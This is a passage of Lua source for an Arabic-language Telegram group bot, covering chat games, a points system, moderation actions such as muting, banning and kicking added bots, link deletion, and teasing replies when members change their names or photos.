name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'سدني','Sydney')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'مختلف','Different')
name = string.gsub(name,'ذكي','Intelligent')
send(msg.chat_id_, msg.id_,'܁༯┆اجب عن التالي  ◃ ˼ '..name..' ˹ ↝ ܰ')
return false
end
end
------------------------------------------------------------------------
if text == ''..(database:get(bot_id..':Set:English'..msg.chat_id_) or '')..'' then 
if not database:get(bot_id..'Set:English:Bot'..msg.chat_id_) then 
database:del(bot_id..':Set:English'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش 😂😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:English:Bot'..msg.chat_id_,true)
end
------------------------------------------------------------------------
if text == 'امثله' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n📌┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
mthal = {'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',};
name = mthal[math.random(#mthal)]
database:set(bot_id..'Set:Amth'..msg.chat_id_,name)
database:del(bot_id..'Set:Amth:Bot'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي____للماعده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل___')
name = string.gsub(name,'بيدك','اكل___محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من___نعال')
name = string.gsub(name,'شقره','مع الخيل يا___')
name = string.gsub(name,'النخله','الطول طول___والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر___')
name = string.gsub(name,'الخيل','من قلة___شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني___')
name = string.gsub(name,'المبلل','___ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة___')
name = string.gsub(name,'يركص','المايعرف___يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح___يكول حامض')
name = string.gsub(name,'العمه','___إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي___للخباز حتى لو ياكل نصه')
name = string.gsub(name,'باحصاد','اسمة___ومنجله مكسور')
name = string.gsub(name,'شهر','امشي__ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن__يا من على الحاضر لكة')
name = string.gsub(name,'القرد','__بعين امه غزال')
name = string.gsub(name,'يكحله','اجه___عماها')
send(msg.chat_id_, msg.id_,'܁༯┆اسرع واحد يكمل المثل ↝ ܰ \n܁༯┆ ˼ '..name..' ˹')
return false
end
end
------------------------------------------------------------------------
if text == ''..(database:get(bot_id..'Set:Amth'..msg.chat_id_) or '')..'' then 
if not database:get(bot_id..'Set:Amth:Bot'..msg.chat_id_) then 
database:del(bot_id..'Set:Amth'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش 😂😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:Amth:Bot'..msg.chat_id_,true)
end
if text == 'تفعيل الالعاب' or text == 'تفعيل اللعبه' and Manager(msg) then  
if not database:get(bot_id..'Lock:Games'..msg.chat_id_)  then
database:set(bot_id..'Lock:Games'..msg.chat_id_,true) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل الالعاب ↝ ܰ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل الالعاب ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الالعاب' or text == 'تعطيل اللعبه' and Manager(msg) then   
if database:get(bot_id..'Lock:Games'..msg.chat_id_)  then
database:del(bot_id..'Lock:Games'..msg.chat_id_) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الالعاب ↝ ܰ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الالعاب ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == 'الالعاب' or text == 'اللعبه' and database:get(bot_id..'Lock:Games'..msg.chat_id_) then
Text_Games = [[
٭ 𖤓┆قائمة الالعاب ↝◟
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
܁ 𖧇゠ لعبة المختلف ▹ ◃ ◞المختلف◜
܁ 𖧇゠ لعبة الاسرع ▹ ◃ ◞الاسرع◜
܁ 𖧇゠ لعبة العكس ▹ ◃ ◞العكس◜
܁ 𖧇゠ لعبة حزوره ▹ ◃ ◞حزوره◜
܁ 𖧇゠ لعبة سمايل ▹ ◃ ◞سمايل◜
܁ 𖧇゠ لعبة معاني ▹ ◃ ◞معاني◜
܁ 𖧇゠ لعبة امثله ▹ ◃ ◞امثله◜
܁ 𖧇゠ لعبة خمن ▹ ◃ ◞خمن◜
܁ 𖧇゠ لعبة بات ▹ ◃ ◞بات◜
܁ 𖧇゠ لعبة انكليزي ▹ ◃ ◞انكليزي◜
܁ 𖧇゠ لعبة رياضيات ▹ ◃ ◞رياضيات◜
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤓┆[𝚃𝚆𝙰𝚂𝙻 𝚂𝙾𝚄𝚁𝙲𝙴](t.me/r_iq6_bot) 
]]
send(msg.chat_id_, msg.id_,Text_Games) 
end
if text == 'نقاطي' or text == 'نقاطي' then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'??┋عذراً عليك الاشتراك في القناة\n📌┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Num = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = '✖┋ لم تلعب اي لعبهہ‌‏ للحصول على نقاط'
else
Text = '🤹‍♂️┋ عدد نقاط التي رحبتها هہ‌‏ي *» { '..Num..' } مجوهہ‌‏رهہ‌‏ *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاطي (%d+)$") then
local NUMPY = text:match("^بيع نقاطي (%d+)$") or text:match("^بيع نقاطي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n??┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n*✖┋ لا يمكنني البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,'✖┇ ليس لديك نقاط من الالعاب \n📬┋ اذا كنت تريد ربح النقاط \n📌┋ ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n✖┋ ليس لديك نقاط بهہ‌‏ذا العدد \n📬┋ لزيادة نقاطك في اللعبه \n📌┋ ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,'🔅┋ تم خصم *» { '..NUMPY..' }* من نقاطك \n📨┋ وتم اضافة* » { '..(NUMPY * 50)..' } رسالهہ‌‏ الى رسالك *')
end 
return false 
end
if text ==("مسح") and Mod(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if database:get(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'id:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "☑┋ تم الغاء الامر ") 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'id:user'..msg.chat_id_)  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
send(msg.chat_id_, msg.id_,"📥┋ تم اضافة لهہ‌‏ {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
if database:get(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'idgem:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "☑┋ تم الغاء الامر ") 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'idgem:user'..msg.chat_id_)  
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,  1, "📥┋ تم اضافة لهہ‌‏ {"..numadded..'} من النقاط', 1, 'md')  
end
------------------------------------------------------------
if text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = '܁༯┆اضغط هنا لمشاهدة العضو ↝ ܰ'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
if text == "شنو رئيك بهذا" or text == "شنو رئيك بهذ" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"܁༯┆كلش حباب وهاي 🦄↝ ܰ","܁༯┆الكياته تبعه تقرا 1000 🥺↝ ܰ","܁༯┆اطلق شخص شحبه 🥺↝ ܰ","زغبا 😹↝.","܁༯┆يوتيوبر رب المعيدي 😹↝ ܰ"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هينه" or text == "رزله" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مااهين حيوانات اني 😹😭💘."," ماا وخر ماسوي شي 😭💘 ."}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "مصه" or text == "بوسه" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ما ما ما اخجل شني 😭😭↝","ماا وخر مابوسك 😭↝↝"," ما ما ما اخجل شني 😭😭↝"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end

if text == 'رابط الحذف' or text == 'رابط حذف' then
t =[[
┐ ههلو عمري حنشتاقلك ↝ .
┤ رابط حذف حسابك في مواقع التواصل ↝ .
┤ ╌╌╌╌╌╌╌╌╌╌ ܁
┤ رابط حذف  [Telegram](https://my.telegram.org/auth?to=delete) ܊ ܁
┤ رابط حذف [instagram](https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/) ܊ ܁
┤ رابط حذف [Facebook](https://www.facebook.com/help/deleteaccount) ܊ ܁
┘ رابط حذف [Snspchat](https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount) ܊ ܁
]]
send(msg.chat_id_, msg.id_,t) 
return false
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
end -- Chat_Type = 'GroupBot' 
end -- end msg
--------------------------------------------------------------------------------------------------------------
function tdcli_update_callback(data)  -- clback
if data.ID == "UpdateChannel" then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
database:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_)  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
local NameChat = chat.title_
local IdChat = msg.chat_id_
Text = '🔖┇ تم طرد البوت من المجموعه\n'..
'\n📮┇ اسم المجموعه {['..NameChat..']}'..
'\n🆔┇ ايدي المجموعه {`'..IdChat..'`}'..
'\n'
sendText(SUDO,Text,0,'md')


end,nil) 
end
end

if data.ID == "UpdateNewMessage" then  -- new msg
msg = data.message_
text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.date_ and msg.date_ < tonumber(os.time() - 15) then
print('OLD MESSAGE')
return false
end
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then
return false
end
--------------------------------------------------------------------------------------------------------------
if text and not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:del(bot_id..'Spam:Texting'..msg.sender_user_id_) 
end
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
if NewCmmd then
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
database:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'܁༯┆تم حذف الامر بنجاح ↝ ܰ')  
else
send(msg.chat_id_, msg.id_,'܁༯┆لايوجد امر بهذا الاسم ↝ ܰ')  
end
database:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end 
-------------------------------------------------------------------------------------------------------------- 
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if (text and text == "ttttggguuu") then 
send(msg.chat_id_, msg.id_, 'kedhs')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "Useuwkq ") then 
send(msg.chat_id_, msg.id_, ' ked uwiq')
database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
end
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'اسو')
if not database:get(bot_id.."Fun_Bots:"..msg.chat_id_) then
if text ==  ""..Name_Bot..' شنو رئيبهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶??','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير الحب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات ??🤷‍♀️','مو خوش ولد 🤓' } 
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'')   
end   
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end  
if text == ""..Name_Bot..' تحب ه' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني ','يولي ماحبه ',' لٱ ايع ','بس لو الكفها اله اعضها 💔','ماخب مطايه اسف','اكلك ۿذﭑ يكلي احبكك لولا ﭑݩٺ شتكول  ','ئووووووووف اموت ع ربه ','ايععععععععع','بلعباس اعشكك','ماحب مخابيل','احبب ميدو وبس','لٱ ماحبه','بله هاي جهره تكلي تحبهه ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئلني احبهم لولا','افبس حبيبي هذا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end    
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Muted_User(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Ban_User(msg.chat_id_,msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_User(msg.chat_id_,msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and GBan_User(msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Gmute_User(msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and GBan_User(msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
database:set(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
MILAN = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(MILAN)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "del" then   
MILAN = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(MILAN)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == 'MessagePinMessage' then
if Constructor(msg) then 
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = database:get(bot_id..'Pin:Id:Msg'..msg.chat_id_)
if Msg_Pin and database:get(bot_id.."lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false
end    
end   
--------------------------------------------------------------------------------------------------------------
SourceMILAN(data.message_,data)
plugin_MILANa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
database:set(bot_id..'user:Name'..msg.sender_user_id_,(data.username_))
end
--------------------------------------------------------------------------------------------------------------
if tonumber(data.id_) == tonumber(bot_id) then
return false
end
local Get_Re_Name = database:get(bot_id.."Chen:Name"..msg.sender_user_id_) 
if Get_Re_Name then 
if Get_Re_Name ~= data.first_name_ then 
tahan = '['..(Get_Re_Name or '')..']'
taham = '['..data.first_name_..']'
local taha ={ 
'\n شكو غيرت اسمك  يا حلو ??🌚',
'\n شهل اسم الفيطي '..taham.. ' \n رجعه ؏ قديم \n '..tahan..'',
'\n  ها ها شو غيرت اسمك 🤔😹',
'\n شكو غيرت اسمك شنو قطيت وحده جديده 😹😹🌚',
'\n شو غيرت اسمك شنو تعاركت ويه الحب ؟😹🌞',
'\n ها ولك مو جان  اسمك   '..tahan..'  شكو غيرته ',
'\n شكو غيرت اسمك شسالفه ؟؟ 🤔🌞'
}
send(msg.chat_id_,msg.id_,taha[math.random(#taha)])
database:set(bot_id.."Chen:Name"..msg.sender_user_id_, data.first_name_) 
return false
end  
end
--------------------------------------------------------------------------------------------------------------
local Getredis = database:get(bot_id.."Chen:User:Name"..msg.sender_user_id_)
if data.username_ then  
if Getredis and Getredis ~= data.username_ then 
tahan = '['..(database:get(bot_id.."Chen:User:Name"..msg.sender_user_id_) or '')..']'
local taha ={ 
'\n شكو غيرت معرفك  يا حلو 😹🌚',
'\n  ها ها شو غيرت معرفك 🤔😹',
'\n شكو غيرت معرفك شنو قطيت وحده جديده 😹😹🌚',
'\n شو غيرت معرفك شنو تعاركت ويه الحب ؟😹🌞',
'\n ها ولك مو جان  معرفك   '..tahan..'  شكو غيرته ',
'\n شكو غيرت معرفك شسالفه ؟؟ 🤔??'
}
send(msg.chat_id_,msg.id_,taha[math.random(#taha)])
database:set(bot_id.."Chen:User:Name"..msg.sender_user_id_, data.username_) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
local Getredis = database:get(bot_id.."Chen:Photo"..msg.sender_user_id_)
if data.profile_photo_ then  
if Getredis and Getredis ~= data.profile_photo_.id_ then 
local taha ={ 
'\n شكو غيرت صورتك  يا حلو 😹🌚',
'\n  ها ها شو غيرت صورتك 🤔😹',
'\n شكو غيرت صورتك شنو قطيت وحده جديده 😹😹🌚',
'\n شو غيرت صورتك شنو تعاركت ويه الحب ؟😹🌞',
'\n شكو غيرت صورتك شسالفه ؟؟ 🤔🌞'
}
send(msg.chat_id_,msg.id_,taha[math.random(#taha)])
database:set(bot_id.."Chen:Photo"..msg.sender_user_id_, data.profile_photo_.id_) 
return false
end
end
end,nil)   
end
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
database:incr(bot_id..'edits'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if database:get(bot_id.."lock_edit_med"..msg.chat_id_) and not Text and not BasicConstructor(result) then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local username = data.username_
local name = data.first_name_
local iduser = data.id_
local users = ('[@'..data.username_..']' or iduser)
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n🚫┇ عضو ما يحاول تعديل الميديا \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "☑️┇ لا يوجد ادمن"
end
send(msg.chat_id_,0,''..t..'\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ٴ\n⚠️┇ تم التعديل على الميديا\n📌┇ العضو الي قام بالتعديل\n📮┇ ايدي العضو ← `'..result.sender_user_id_..'`\n⛔┇ معرف العضو←{ '..users..' }') 
end,nil)
DeleteMessage(msg.chat_id_,{[0] = msg.message_id_}) 
end
local text = result.content_.text_
if not Mod(result) then
------------------------------------------------------------------------
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text:match("[hH][tT][tT][pP][sT]") or text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text:match("[Hh][Tt][Tt][Pp]://[Ww][Ww][Ww].[Ii][Nn][Ss][Tt][Aa][Gg][Rr][Aa][Mm].[Cc][Oo][Mm]")  then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
